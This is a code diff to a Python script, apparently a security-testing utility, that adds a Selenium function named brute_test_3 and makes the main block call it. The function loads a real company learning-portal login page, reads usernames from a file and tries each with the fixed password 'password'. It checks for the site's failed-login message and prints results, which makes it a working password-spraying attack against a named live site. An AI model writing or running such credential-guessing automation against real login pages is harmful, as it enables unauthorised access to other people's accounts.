@@ -616,13 +616,46 @@ def brute_test_2():
     ]
 
 
+def brute_test_3():
+    from selenium import webdriver
+    from selenium.webdriver.common.by import By
+
+    driver = webdriver.Chrome()
+    driver.get("https://learning.liteon.com/dist/index.html#login")
+    # 等待一小段時間，確保 HTTP Basic Auth 彈出視窗已經出現
+    time.sleep(10)
+    with open("account.txt", 'r', encoding='utf-8') as temp_file:
+        temp_data = temp_file.readlines()
+        for line in temp_data:
+            line = line.replace("\n", "")
+            username_element = driver.find_element(By.NAME, 'account')
+            username_element.clear()
+            username_element.send_keys(line)
+            password_element = driver.find_element(By.NAME, 'password')
+            password_element.clear()
+            password_element.send_keys("password")
+            time.sleep(1)
+            login_button = driver.find_element(By.XPATH, '/html/body/div[2]/div/div/div[2]/form/div[3]/button')
+            login_button.click()
+            time.sleep(3)
+            try:
+                driver.find_element("xpath", "//p[contains(@class, 'pt-mark-override') and "
+                                             "text()='帳號或密碼錯誤！請重新輸入您的帳號及密碼']")
+                print(str(line))
+            except Exception as ex:
+                pass
+            finally:
+                time.sleep(2)
+
+    driver.quit()
+
 
 # testcase
 if __name__ == '__main__':
     # print(read_get(input_url="https://www.example.com"))
     # print(read_bing_search('Cymetrics'))
     # print(read_google_search('Cymetrics'))
-    brute_test_1()
+    brute_test_3()
     """
     # auto login ithome
     read_login_form(input_url="https://member.ithome.com.tw/login",
